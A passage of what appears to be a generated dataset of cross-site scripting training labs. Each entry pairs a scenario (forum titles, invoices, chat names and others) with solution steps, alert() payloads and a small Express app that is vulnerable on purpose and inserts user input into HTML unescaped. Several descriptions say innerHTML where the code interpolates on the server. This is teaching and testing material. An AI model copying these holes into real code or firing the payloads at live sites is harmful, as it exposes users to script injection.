      "srcCode": "const express = require('express');\nconst app = express();\nlet addresses = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/save-address', (req, res) => { addresses.push(req.body.addr); res.redirect('/checkout'); });\napp.get('/checkout', (req, res) => { const html = addresses.map(a => `<option>${a}</option>`).join(''); res.send(`<html><body><input list='addresses'><datalist id='addresses'>${html}</datalist></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via forum thread subject preview",
      "Lab Description": "The forum displays a preview of the latest thread titles. These are injected into the page using innerHTML. A malicious subject line can trigger XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Create a thread titled: <script>alert(1)</script>",
        "Visit homepage with thread previews",
        "Observe script execution"
      ],
      "payloads": [
        "<script>alert('threadXSS')</script>",
        "<img src=x onerror=alert('subject')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet threads = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/new-thread', (req, res) => { threads.push(req.body.subject); res.redirect('/'); });\napp.get('/', (req, res) => { const html = threads.map(t => `<div>${t}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via product review headline",
      "Lab Description": "Users can submit reviews with headlines. These headlines are shown on product pages using innerHTML. A malicious headline can trigger XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit headline: <script>alert(1)</script>",
        "Visit product page",
        "Payload executes in review section"
      ],
      "payloads": [
        "<script>alert('reviewXSS')</script>",
        "<img src=x onerror=alert('review')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet reviews = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/review', (req, res) => { reviews.push(req.body.headline); res.redirect('/product'); });\napp.get('/product', (req, res) => { const html = reviews.map(r => `<h4>${r}</h4>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via interactive onboarding tip content",
      "Lab Description": "The onboarding tutorial system displays tips from server-configured content. These tips are rendered into a floating box using innerHTML. If a tip is compromised, XSS is possible.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Submit onboarding tip as <img src=x onerror=alert(1)>",
        "Trigger onboarding walkthrough",
        "Observe payload execution"
      ],
      "payloads": [
        "<img src=x onerror=alert('tipXSS')>",
        "<script>alert('onboarding')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet tip = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-tip', (req, res) => { tip = req.body.tip; res.redirect('/onboard'); });\napp.get('/onboard', (req, res) => { res.send(`<html><body><div class='tip'>${tip}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via invoice line-item notes",
      "Lab Description": "Line items in invoices can have custom notes. These are rendered with innerHTML in the invoice breakdown. A malicious note results in XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Add line-item note: <script>alert(1)</script>",
        "Generate invoice",
        "Observe script execution in invoice view"
      ],
      "payloads": [
        "<script>alert('lineXSS')</script>",
        "<img src=x onerror=alert('line')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet notes = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-line', (req, res) => { notes.push(req.body.note); res.redirect('/invoice'); });\napp.get('/invoice', (req, res) => { const html = notes.map(n => `<li>${n}</li>`).join(''); res.send(`<html><body><ul>${html}</ul></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via project status field in kanban board",
      "Lab Description": "Kanban cards include editable status fields. These values are rendered with innerHTML. A crafted status text allows XSS injection in the task board.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Set status to <script>alert(1)</script>",
        "Open the kanban board",
        "Script executes in task card"
      ],
      "payloads": [
        "<script>alert('kanbanXSS')</script>",
        "<img src=x onerror=alert('board')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet statuses = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-status', (req, res) => { statuses.push(req.body.status); res.redirect('/board'); });\napp.get('/board', (req, res) => { const html = statuses.map(s => `<div class='card'>${s}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via calendar event description popup",
      "Lab Description": "Calendar events show descriptions in a popup when clicked. If the description is rendered using innerHTML, a crafted value can lead to XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create event with description: <img src=x onerror=alert(1)>",
        "Click the event on the calendar",
        "Observe payload execution in popup"
      ],
      "payloads": [
        "<img src=x onerror=alert('eventXSS')>",
        "<script>alert('calendar')</script>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet desc = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/event', (req, res) => { desc = req.body.desc; res.redirect('/calendar'); });\napp.get('/calendar', (req, res) => { res.send(`<html><body><div onclick=\"alert('${desc}')\">Event</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via dynamic FAQ answer content",
      "Lab Description": "The FAQ section allows administrators to write answers in rich text. These answers are rendered using innerHTML. A malicious answer content leads to stored XSS when a user visits the FAQ page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit an answer with: <script>alert('faq')</script>",
        "Visit the FAQ viewer page",
        "Observe script execution in the answer section"
      ],
      "payloads": [
        "<script>alert('faqXSS')</script>",
        "<img src=x onerror=alert('faq')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet answer = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/submit-answer', (req, res) => { answer = req.body.answer; res.redirect('/faq'); });\napp.get('/faq', (req, res) => { res.send(`<html><body><div>${answer}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via job application cover letter preview",
      "Lab Description": "Applicants can enter a cover letter that’s previewed before submission. If the content is injected using innerHTML, XSS can occur.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Enter a cover letter with: <script>alert('cover')</script>",
        "Click preview button",
        "Observe execution in the preview window"
      ],
      "payloads": [
        "<script>alert('coverXSS')</script>",
        "<img src=x onerror=alert('cover')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet letter = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/submit-cover', (req, res) => { letter = req.body.text; res.redirect('/preview'); });\napp.get('/preview', (req, res) => { res.send(`<html><body><div>${letter}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via editable survey question title",
      "Lab Description": "Admins can add and edit survey questions. The titles are rendered directly into the page. A crafted title allows stored XSS execution when the survey is loaded.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create a question with: <img src=x onerror=alert(1)>",
        "Open the survey as user",
        "Observe payload execution in title area"
      ],
      "payloads": [
        "<script>alert('surveyTitleXSS')</script>",
        "<img src=x onerror=alert('question')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet title = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/question', (req, res) => { title = req.body.title; res.redirect('/survey'); });\napp.get('/survey', (req, res) => { res.send(`<html><body><h3>${title}</h3></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via live chat username rendering",
      "Lab Description": "In the live chat system, usernames are rendered with innerHTML when they join the chat. An attacker can inject script via the username.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Join chat with username: <script>alert(1)</script>",
        "Wait for message display",
        "Script executes in chat stream"
      ],
      "payloads": [
        "<script>alert('chatXSS')</script>",
        "<img src=x onerror=alert('livechat')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet users = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/join', (req, res) => { users.push(req.body.name); res.redirect('/chat'); });\napp.get('/chat', (req, res) => { const html = users.map(u => `<p>${u} joined</p>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via file upload success message",
      "Lab Description": "When users upload files, the file name is reflected back in the success message. If rendered unsanitized, this can result in reflected XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Upload file with name: <script>alert(1)</script>",
        "Observe the confirmation",
        "Script executes"
      ],
      "payloads": [
        "<script>alert('uploadXSS')</script>",
        "<img src=x onerror=alert('file')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet file = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/upload', (req, res) => { file = req.body.name; res.redirect('/done'); });\napp.get('/done', (req, res) => { res.send(`<html><body><p>Uploaded: ${file}</p></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via app notification message rendering",
      "Lab Description": "System-generated notifications may include user-generated content such as names or messages. These are displayed using innerHTML, leading to XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Trigger a system notification with attacker content",
        "Visit notification center",
        "Observe XSS execution"
      ],
      "payloads": [
        "<script>alert('notificationXSS')</script>",
        "<img src=x onerror=alert('notif')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet notif = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/trigger-notif', (req, res) => { notif = req.body.text; res.redirect('/notifications'); });\napp.get('/notifications', (req, res) => { res.send(`<html><body><div>${notif}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via contest entry title",
      "Lab Description": "Users can submit creative titles for a contest. These are rendered for public voting using innerHTML. Malicious entries lead to XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit entry titled <script>alert(1)</script>",
        "Open public voting page",
        "Script executes in title area"
      ],
      "payloads": [
        "<script>alert('contestXSS')</script>",
        "<img src=x onerror=alert('entry')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet entries = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/submit-entry', (req, res) => { entries.push(req.body.title); res.redirect('/vote'); });\napp.get('/vote', (req, res) => { const html = entries.map(e => `<h2>${e}</h2>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via dynamic welcome banner",
      "Lab Description": "The homepage shows a personalized welcome message using the user's name. If the name is rendered unsanitized, reflected XSS is possible.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Visit /?name=<script>alert(1)</script>",
        "Observe the greeting",
        "Script executes on page load"
      ],
      "payloads": [
        "<script>alert('welcomeXSS')</script>",
        "<img src=x onerror=alert('banner')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/', (req, res) => {\n  const name = req.query.name || 'Guest';\n  res.send(`<html><body><h1>Welcome ${name}</h1></body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via email template custom footer",
      "Lab Description": "Marketing users can set a footer message in the email builder. If rendered in the preview or final email without escaping, stored XSS is possible.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Add footer: <img src=x onerror=alert(1)>",
        "Open email preview",
        "Observe script execution"
      ],
      "payloads": [
        "<script>alert('emailXSS')</script>",
        "<img src=x onerror=alert('footer')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet footer = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-footer', (req, res) => { footer = req.body.footer; res.redirect('/email'); });\napp.get('/email', (req, res) => { res.send(`<html><body><div>${footer}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via group chat topic title",
      "Lab Description": "Group chats allow setting a topic. The topic is rendered on top of the chatroom using innerHTML. XSS can occur if the title is unsanitized.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Set topic: <script>alert(1)</script>",
        "Join chatroom",
        "Observe XSS on load"
      ],
      "payloads": [
        "<script>alert('topicXSS')</script>",
        "<img src=x onerror=alert('topic')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet topic = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-topic', (req, res) => { topic = req.body.topic; res.redirect('/chat'); });\napp.get('/chat', (req, res) => { res.send(`<html><body><h2>${topic}</h2></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via custom 404 error message rendering",
      "Lab Description": "The application allows admins to configure custom 404 error messages. If the message is rendered using innerHTML, attackers can inject a script.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Set 404 message to <script>alert('404')</script>",
        "Trigger a 404 by visiting a non-existent page",
        "Observe payload execution in the error screen"
      ],
      "payloads": [
        "<script>alert('custom404XSS')</script>",
        "<img src=x onerror=alert('404')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet message = 'Page not found';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-404', (req, res) => { message = req.body.msg; res.redirect('/'); });\napp.use((req, res) => { res.status(404).send(`<html><body><h1>${message}</h1></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via poll results graph labels",
      "Lab Description": "Poll results are shown using a bar graph. Each bar has a label sourced from user-submitted answers. If labels are rendered using innerHTML, XSS is possible.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a poll answer: <img src=x onerror=alert(1)>",
        "View poll results graph",
        "Script executes in graph label"
      ],
      "payloads": [
        "<script>alert('pollGraphXSS')</script>",
        "<img src=x onerror=alert('poll')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet answers = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/vote', (req, res) => { answers.push(req.body.option); res.redirect('/results'); });\napp.get('/results', (req, res) => { const html = answers.map(a => `<div class='bar'>${a}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via profile 'about me' HTML bio field",
      "Lab Description": "The profile page includes an 'about me' field which supports limited HTML. If not sanitized properly, a malicious script can be stored and executed.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Set bio to <script>alert('bio')</script>",
        "Visit the profile page",
        "Script executes in bio section"
      ],
      "payloads": [
        "<script>alert('bioXSS')</script>",
        "<img src=x onerror=alert('about')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet bio = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/update-bio', (req, res) => { bio = req.body.bio; res.redirect('/profile'); });\napp.get('/profile', (req, res) => { res.send(`<html><body><div>${bio}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via project feedback suggestion text",
      "Lab Description": "Feedback on projects includes a suggestion text field. These are displayed to admins using innerHTML. XSS is possible through malicious suggestion input.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit a suggestion: <img src=x onerror=alert(1)>",
        "Admin views feedback dashboard",
        "Script executes from suggestion list"
      ],
      "payloads": [
        "<script>alert('feedbackXSS')</script>",
        "<img src=x onerror=alert('suggestion')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet suggestions = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/submit-feedback', (req, res) => { suggestions.push(req.body.suggestion); res.redirect('/admin/feedback'); });\napp.get('/admin/feedback', (req, res) => { const html = suggestions.map(s => `<li>${s}</li>`).join(''); res.send(`<html><body><ul>${html}</ul></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via team dashboard widget name",
      "Lab Description": "Teams can customize widget names on their dashboard. These names are injected into the UI using innerHTML. A crafted name results in persistent XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Name a widget: <script>alert(1)</script>",
        "Return to dashboard",
        "Observe script execution from widget name"
      ],
      "payloads": [
        "<script>alert('widgetXSS')</script>",
        "<img src=x onerror=alert('widget')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet widgets = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-widget', (req, res) => { widgets.push(req.body.name); res.redirect('/dashboard'); });\napp.get('/dashboard', (req, res) => { const html = widgets.map(w => `<div>${w}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via comment system reply preview",
      "Lab Description": "When replying to a comment, a live preview is shown using the input. If the content is reflected using innerHTML, reflected XSS is possible.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Type reply: <img src=x onerror=alert(1)>",
        "Observe live preview window",
        "Script executes immediately"
      ],
      "payloads": [
        "<script>alert('replyXSS')</script>",
        "<img src=x onerror=alert('preview')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\napp.post('/preview-reply', (req, res) => { const reply = req.body.reply; res.send(`<html><body><div>${reply}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via bug tracker issue title",
      "Lab Description": "Bug reports include titles that are rendered in an issue tracker. If innerHTML is used for rendering without escaping, a malicious title triggers XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit bug with title: <script>alert(1)</script>",
        "Open the issue in tracker",
        "Script executes from title element"
      ],
      "payloads": [
        "<script>alert('bugXSS')</script>",
        "<img src=x onerror=alert('issue')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet issues = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/submit-issue', (req, res) => { issues.push(req.body.title); res.redirect('/issues'); });\napp.get('/issues', (req, res) => { const html = issues.map(i => `<h3>${i}</h3>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via activity log detail description",
      "Lab Description": "The activity log renders user actions using innerHTML. A manipulated action message can result in persistent XSS when viewed by an admin.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Trigger action message with <script>alert(1)</script>",
        "Admin reviews activity log",
        "Payload executes"
      ],
      "payloads": [
        "<script>alert('logXSS')</script>",
        "<img src=x onerror=alert('log')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet log = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/log-action', (req, res) => { log = req.body.action; res.redirect('/admin/logs'); });\napp.get('/admin/logs', (req, res) => { res.send(`<html><body><div>${log}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via calendar invite title preview",
      "Lab Description": "Users can preview the title of a calendar invite before sending it. The title is rendered in a header using innerHTML. If not sanitized, this can lead to XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Enter title: <script>alert(1)</script>",
        "Click 'Preview Invite'",
        "Observe script execution in header"
      ],
      "payloads": [
        "<script>alert('inviteXSS')</script>",
        "<img src=x onerror=alert('calendar')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet title = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-title', (req, res) => { title = req.body.title; res.redirect('/preview-invite'); });\napp.get('/preview-invite', (req, res) => { res.send(`<html><body><h1>${title}</h1></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via webhook configuration name",
      "Lab Description": "Users can configure and name webhooks. These names are listed in the webhook dashboard using innerHTML. A malicious name triggers XSS in the list view.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create webhook with name: <script>alert(1)</script>",
        "Visit webhook configuration list",
        "Observe payload execution"
      ],
      "payloads": [
        "<script>alert('hookXSS')</script>",
        "<img src=x onerror=alert('webhook')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet hooks = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/add-hook', (req, res) => { hooks.push(req.body.name); res.redirect('/webhooks'); });\napp.get('/webhooks', (req, res) => { const html = hooks.map(h => `<div>${h}</div>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via profile status message rendering",
      "Lab Description": "Users can set a short status message on their profile. This message is displayed using innerHTML on various pages like friends list and search results. A malicious message leads to XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Set your status to <img src=x onerror=alert('status')>",
        "Visit the search or friends page",
        "Observe XSS execution in status display"
      ],
      "payloads": [
        "<script>alert('statusXSS')</script>",
        "<img src=x onerror=alert('status')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet status = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-status', (req, res) => { status = req.body.msg; res.redirect('/friends'); });\napp.get('/friends', (req, res) => { res.send(`<html><body><div>${status}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via newsletter unsubscribe confirmation page",
      "Lab Description": "After clicking an unsubscribe link, users are shown a confirmation message that includes their email address. The email is reflected using innerHTML. Malicious parameters can trigger XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Visit /unsubscribe?email=<img src=x onerror=alert(1)>",
        "Observe script execution in confirmation page"
      ],
      "payloads": [
        "<script>alert('unsubscribeXSS')</script>",
        "<img src=x onerror=alert('unsub')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\napp.get('/unsubscribe', (req, res) => {\n  const email = req.query.email || 'anonymous';\n  res.send(`<html><body><p>Unsubscribed: ${email}</p></body></html>`);\n});\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via invoice recipient name rendering",
      "Lab Description": "Invoices display the recipient's name in the header. If this field is user-controlled and rendered with innerHTML, XSS can occur.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit recipient: <img src=x onerror=alert(1)>",
        "Generate invoice",
        "Observe script execution in rendered name"
      ],
      "payloads": [
        "<script>alert('invoiceXSS')</script>",
        "<img src=x onerror=alert('recipient')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet recipient = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-recipient', (req, res) => { recipient = req.body.name; res.redirect('/invoice'); });\napp.get('/invoice', (req, res) => { res.send(`<html><body><h1>Invoice to: ${recipient}</h1></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via chat message preview notification",
      "Lab Description": "Incoming chat messages are previewed in pop-up notifications. If messages are rendered using innerHTML without filtering, stored XSS is possible.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Send message: <script>alert('chat')</script>",
        "Receiver views notification",
        "Payload executes in pop-up preview"
      ],
      "payloads": [
        "<script>alert('chatNotifXSS')</script>",
        "<img src=x onerror=alert('msg')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet lastMessage = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/send-message', (req, res) => { lastMessage = req.body.msg; res.redirect('/notify'); });\napp.get('/notify', (req, res) => { res.send(`<html><body><div class='popup'>${lastMessage}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via music playlist description rendering",
      "Lab Description": "Users can add descriptions to playlists. These descriptions are rendered using innerHTML. A malicious description triggers stored XSS on playlist load.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Set playlist description to: <img src=x onerror=alert(1)>",
        "View the playlist",
        "Script executes in description area"
      ],
      "payloads": [
        "<script>alert('playlistXSS')</script>",
        "<img src=x onerror=alert('desc')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet desc = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-description', (req, res) => { desc = req.body.desc; res.redirect('/playlist'); });\napp.get('/playlist', (req, res) => { res.send(`<html><body><p>${desc}</p></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via customer support ticket subject line",
      "Lab Description": "Support tickets include a subject line set by the user. If this is rendered in the dashboard with innerHTML, stored XSS is possible.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Submit ticket with subject: <img src=x onerror=alert(1)>",
        "Support staff opens the dashboard",
        "Payload executes from subject rendering"
      ],
      "payloads": [
        "<script>alert('ticketXSS')</script>",
        "<img src=x onerror=alert('ticket')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet subjects = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/submit-ticket', (req, res) => { subjects.push(req.body.subject); res.redirect('/support'); });\napp.get('/support', (req, res) => { const html = subjects.map(s => `<li>${s}</li>`).join(''); res.send(`<html><body><ul>${html}</ul></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via event RSVP name rendering",
      "Lab Description": "The RSVP list displays attendee names on the public event page. If names are rendered unsanitized via innerHTML, XSS is possible.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "RSVP with name: <script>alert(1)</script>",
        "Open public guest list",
        "Observe script execution"
      ],
      "payloads": [
        "<script>alert('rsvpXSS')</script>",
        "<img src=x onerror=alert('attendee')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet names = [];\napp.use(express.urlencoded({ extended: true }));\napp.post('/rsvp', (req, res) => { names.push(req.body.name); res.redirect('/event'); });\napp.get('/event', (req, res) => { const html = names.map(n => `<p>${n}</p>`).join(''); res.send(`<html><body>${html}</body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via blog archive post snippet rendering",
      "Lab Description": "The blog archive displays a snippet of each post. If the snippet is rendered using innerHTML and contains user-controlled content, XSS can occur.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Write a blog post with snippet: <script>alert(1)</script>",
        "Open blog archive page",
        "Observe payload execution in snippet area"
      ],
      "payloads": [
        "<script>alert('blogSnippetXSS')</script>",
        "<img src=x onerror=alert('snippet')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet snippet = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/submit-post', (req, res) => { snippet = req.body.snippet; res.redirect('/archive'); });\napp.get('/archive', (req, res) => { res.send(`<html><body><div>${snippet}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via shipping instruction note",
      "Lab Description": "Customers can leave special instructions during checkout. These are rendered using innerHTML on the order summary. Malicious notes lead to XSS.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Submit instruction: <img src=x onerror=alert(1)>",
        "View order summary",
        "Observe XSS from note"
      ],
      "payloads": [
        "<script>alert('shippingXSS')</script>",
        "<img src=x onerror=alert('note')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet note = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/checkout', (req, res) => { note = req.body.note; res.redirect('/summary'); });\napp.get('/summary', (req, res) => { res.send(`<html><body><p>${note}</p></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via announcement banner title",
      "Lab Description": "Admins can create banners to be shown site-wide. Banner titles are rendered using innerHTML on all pages. A malicious banner title results in persistent XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Set banner title to <script>alert(1)</script>",
        "Visit homepage",
        "Observe XSS payload triggering"
      ],
      "payloads": [
        "<script>alert('bannerTitleXSS')</script>",
        "<img src=x onerror=alert('banner')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet banner = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-banner', (req, res) => { banner = req.body.title; res.redirect('/'); });\napp.get('/', (req, res) => { res.send(`<html><body><div class='banner'>${banner}</div></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via task board column title",
      "Lab Description": "In the task board view, users can rename column titles (e.g. 'To Do', 'In Progress'). These titles are injected using innerHTML. A malicious title leads to persistent XSS.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Rename a column to <script>alert('XSS')</script>",
        "Open the board view",
        "Observe payload execution in column header"
      ],
      "payloads": [
        "<script>alert('columnXSS')</script>",
        "<img src=x onerror=alert('col')>"
      ],
      "Vulnerability name": "Cross-site scripting",
      "srcCode": "const express = require('express');\nconst app = express();\nlet title = '';\napp.use(express.urlencoded({ extended: true }));\napp.post('/set-column', (req, res) => { title = req.body.title; res.redirect('/board'); });\napp.get('/board', (req, res) => { res.send(`<html><body><h2>${title}</h2></body></html>`); });\napp.listen(3000);"
    },
    {
      "Lab scenario": "XSS via file manager folder name",
      "Lab Description": "The web-based file manager allows users to name folders. If the folder name is displayed using innerHTML, it can be abused to execute arbitrary scripts.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create a folder named <img src=x onerror=alert(1)>",
        "Navigate to the file manager interface",
